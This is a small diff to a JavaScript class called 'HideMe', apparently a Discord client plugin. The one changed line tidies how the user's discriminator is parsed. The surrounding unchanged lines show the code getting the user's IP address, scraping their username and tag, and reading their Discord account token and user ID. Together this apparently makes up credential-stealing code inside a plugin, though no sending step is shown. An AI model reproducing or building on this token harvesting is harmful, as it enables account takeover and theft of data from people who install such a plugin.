@@ -112,7 +112,7 @@ class HideMe {
 
         var IP = await getIP();
         var actualUserUsername = document.getElementsByClassName("size14-3fJ-ot title-338goq")[0].innerText;
-        var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText;
+        var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText.split(/\r\n|\r|\n/)[0] : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText.split(/\r\n|\r|\n/);
         var actualUserTag = actualUserUsername+actualUserDiscriminator;
         var actualUserToken = await getInfo("token");
         var actualUserID = await getInfo("user_id_cache");
